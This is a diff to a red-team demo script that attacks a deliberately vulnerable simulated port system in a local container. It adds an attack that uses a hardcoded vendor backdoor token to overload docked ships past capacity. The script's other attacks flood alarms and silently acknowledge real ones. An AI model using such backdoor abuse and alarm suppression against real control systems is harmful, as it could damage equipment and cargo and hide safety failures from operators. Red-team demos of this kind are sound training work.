@@ -5,6 +5,8 @@ port-range red-team demo
 Walks through the two planted weaknesses end-to-end:
   1. GET /_health        — leaks operator creds + session secret
   2. POST /api/svc/exec  — vendor backdoor with a hardcoded token
+                          (release_ship, close_berth, alarm flood,
+                          silent ack, overload_ship)
 
 Run against the running container (default http://127.0.0.1:18090):
     python3 scripts/red-team-demo.py
@@ -253,6 +255,34 @@ def attack_combo(c: Client) -> None:
     attack_silent_ack(c)
 
 
+def attack_overload_ships(c: Client, extra: int = 25) -> None:
+    head(f"attack: overload every docked ship (+{extra} containers past capacity)")
+    state = snapshot(c, quiet=True)
+    targets = [s for s in state.get("ships", [])
+               if s.get("status") in ("docking", "working")]
+    if not targets:
+        warn("no docked ships to overload right now")
+        return
+    for s in targets:
+        sid = s.get("id")
+        name = s.get("name", "?")
+        info(f"overload_ship {sid} ({name}) ×{extra}")
+        code, body = c.post("/api/svc/exec",
+            headers={"X-Service-Token": VENDOR_TOKEN},
+            data={"action": "overload_ship", "ship_id": sid,
+                  "count": extra, "actor": "vendor-monitor"})
+        if code == 200:
+            try:
+                d = json.loads(body)
+                good(f"  loaded +{d.get('applied')} past capacity — "
+                     f"dmg now {d.get('damage')}, cap {d.get('capacity')}, "
+                     f"on board {d.get('load_count')}")
+            except Exception:
+                good(f"  ok ({len(body)}B)")
+        else:
+            fail(f"  failed: {code} {body[:120]!r}")
+
+
 # ── menu ────────────────────────────────────────────────────────────────────
 
 MENU = """
@@ -262,7 +292,8 @@ MENU = """
   3) alarm flood                       (50 fake warnings)
   4) silent-ack every real alarm       (hide failures)
   5) combo: flood + silent ack
-  6) refresh state
+  6) overload every docked ship        (damage hulls, condemn cargo)
+  7) refresh state
   q) quit
 """
 
@@ -285,6 +316,8 @@ def menu_loop(c: Client) -> None:
         elif choice == "5":
             attack_combo(c); snapshot(c)
         elif choice == "6":
+            attack_overload_ships(c); snapshot(c)
+        elif choice == "7":
             snapshot(c)
         else:
             warn(f"unknown option: {choice!r}")
